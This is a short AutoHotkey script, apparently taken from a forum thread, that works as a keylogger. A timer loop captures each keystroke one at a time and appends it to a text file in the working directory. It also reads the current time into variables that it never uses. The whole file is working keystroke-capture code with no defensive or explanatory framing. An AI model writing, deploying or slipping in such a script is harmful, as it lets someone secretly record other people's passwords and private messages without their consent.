;https://www.autohotkey.com/boards/viewtopic.php?t=29780
#SingleInstance force
#Persistent
settimer start1, 0
start1:
H=%A_Hour% ;pido la hora minuto segundo y milisegundo
M=%A_Min%
S=%A_Sec%
MS=%A_MSec%
Input, Key, L1
FileAppend , %Key% , %A_WorkingDir%\NewTextFile3.txt
return